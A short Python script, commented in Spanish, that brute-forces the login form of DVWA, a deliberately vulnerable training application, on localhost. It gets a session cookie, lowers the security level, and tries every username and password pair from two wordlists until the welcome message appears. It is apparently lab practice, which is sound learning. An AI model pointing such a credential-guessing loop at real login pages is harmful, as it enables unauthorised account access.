import requests

# URL de DVWA para la página de login y vulnerabilidad
login_url = 'http://localhost:8080/login.php'
brute_force_url = 'http://localhost:8080/vulnerabilities/brute/'

# Archivos de texto con usuarios y contraseñas
users_file = 'userlist.txt'
passwords_file = 'passwordlist.txt'

# Credenciales de inicio de sesión en DVWA
login_data = {
    'username': 'admin',  # Cambia según sea necesario
    'password': 'password',  # Cambia según sea necesario
    'Login': 'Login'
}

# Cabeceras HTTP a utilizar para la solicitud
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded'
}

# Función para leer líneas de un archivo
def read_lines(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]

# Función para obtener PHPSESSID dinámicamente
def get_session_cookies():
    session = requests.Session()
    # Realiza el login en DVWA
    session.post(login_url, data=login_data, headers=headers)
    # Retorna las cookies de la sesión
    return session.cookies

# Función para realizar el ataque de fuerza bruta
def brute_force_attack():
    users = read_lines(users_file)
    passwords = read_lines(passwords_file)
    cookies = get_session_cookies()

    # Añade el nivel de seguridad a las cookies
    cookies.set('security', 'low', domain='localhost')

    for username in users:
        for password in passwords:
            data = {
                'username': username,
                'password': password,
                'Login': 'Login'
            }
            response = requests.post(brute_force_url, headers=headers, cookies=cookies, params=data)

            # Verificar el contenido de la página para encontrar el mensaje correcto
            if 'Welcome to the password protected' in response.text:
                print(f'[SUCCESS] Usuario: {username} Contraseña: {password}')
                return
            else:
                print(f'[FAILED] Usuario: {username} Contraseña: {password}')

# Ejecutar el ataque de fuerza bruta
brute_force_attack()
